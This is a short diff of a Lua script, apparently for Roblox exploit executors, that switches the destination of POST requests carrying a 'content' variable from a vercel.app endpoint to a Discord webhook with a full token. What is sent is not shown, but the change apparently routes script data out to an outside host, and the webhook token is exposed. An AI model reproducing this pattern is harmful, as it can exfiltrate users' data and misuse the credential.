@@ -15,13 +15,13 @@ local function L_1_func()
                 })
             elseif http_request then
                 http_request({
-                    Url = "https://python-hello-world-one-blue.vercel.app/api",
+                    Url = "https://discord.com/api/webhooks/1408152735198613584/4xA1sAgdn7QaCLbngQNCSx7oXqHgarVQeTmd-7cixoAfQXOC828oy7DI7aUPUcuU-u92",
                     Body = content,
                     Method = "POST"
                 })
             elseif fluxus and fluxus.request then
                 fluxus.request({
-                    Url = "https://python-hello-world-one-blue.vercel.app/api",
+                    Url = "https://discord.com/api/webhooks/1408152735198613584/4xA1sAgdn7QaCLbngQNCSx7oXqHgarVQeTmd-7cixoAfQXOC828oy7DI7aUPUcuU-u92",
                     Body = content,
                     Method = "POST"
                 })
